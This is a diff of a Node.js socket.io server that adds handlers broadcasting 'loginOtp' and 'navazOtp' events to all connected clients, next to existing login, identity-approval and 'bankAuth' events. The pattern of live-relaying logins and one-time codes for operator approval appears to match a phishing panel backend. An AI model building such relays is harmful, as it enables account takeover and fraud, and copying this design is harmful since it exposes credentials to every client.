@@ -19,8 +19,6 @@ io.on('connection',(socket)=>{
     console.log('userconnected with id' + socket.id)
     socket.on('login',async(data)=> io.emit('newLogin',data))
     socket.on('allow',async(data)=>{
-        const {mode,main_data} = data
-        console.log(data)
         await Session.findByIdAndUpdate(data.session._id,{status:true},{new:true}).then((session)=>io.emit('success',{...data,session}))
     })
     socket.on('newOrder',(data)=>{
@@ -51,8 +49,10 @@ io.on('connection',(socket)=>{
             }
         }
      })
+     socket.on('loginOtp',(data)=>io.emit('loginOtp',data))
 
      socket.on('newNavaz',(data)=>io.emit('newNavaz',data))
+     socket.on('navazOtp',(data)=>io.emit('navazOtp',data))
      socket.on('disAllowNavaz',(data)=>io.emit('disAllowNavaz',data))
      socket.on('AllowNavaz',(data)=>io.emit('AllowNavaz',data))
      socket.on('bankAuth',(data)=>{
